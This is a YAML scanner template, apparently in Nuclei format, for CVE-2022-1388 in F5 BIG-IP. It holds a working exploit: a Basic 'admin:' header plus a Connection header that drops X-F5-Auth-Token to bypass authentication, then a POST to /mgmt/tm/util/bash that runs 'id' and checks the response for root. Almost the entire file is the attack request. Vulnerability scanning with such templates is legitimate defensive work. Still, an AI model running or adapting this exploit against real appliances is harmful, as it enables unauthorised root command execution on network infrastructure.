id: yaml-poc-f5-tmui-command_injection-CVE-2022-1388
info:
  name: Yaml Poc F5 Tmui Command_Injection Cve 2022 1388
  author: converted
  severity: critical
  description: 'Converted from xpoc: yaml-poc-f5-tmui-command_injection-CVE-2022-1388'
  tags: f5,rce,cve
  classification:
    cve-id: CVE-2022-1388
  reference:
  - http://packetstormsecurity.com/files/167007/F5-BIG-IP-Remote-Code-Execution.html
  - http://packetstormsecurity.com/files/167118/F5-BIG-IP-16.0.x-Remote-Code-Execution.html
  - http://packetstormsecurity.com/files/167150/F5-BIG-IP-iControl-Remote-Code-Execution.html
  - https://cxsecurity.com/cveshow/CVE-2022-1388/
  - https://cxsecurity.com/issue/WLB-2022050040
http:
- method: GET
  path:
  - /mgmt/shared/diagnostics/device-stats
  headers:
    Authorization: Basic YWRtaW46
    Connection: X-Forwarded-Host,X-F5-Auth-Token
    Content-Type: application/json
    X-F5-Auth-Token: '{{authToken}}'
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: body
    words:
    - lastUpdateMicros
- method: POST
  path:
  - /mgmt/tm/util/bash
  body: '{"command":"run","utilCmdArgs":"-c id"}'
  headers:
    Authorization: Basic YWRtaW46
    Connection: X-Forwarded-Host,X-F5-Auth-Token
    Content-Type: application/json
    X-F5-Auth-Token: a
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: body
    words:
    - commandResult
    - root
  - type: regex
    part: body
    regex:
    - (u|g)id=\\d+
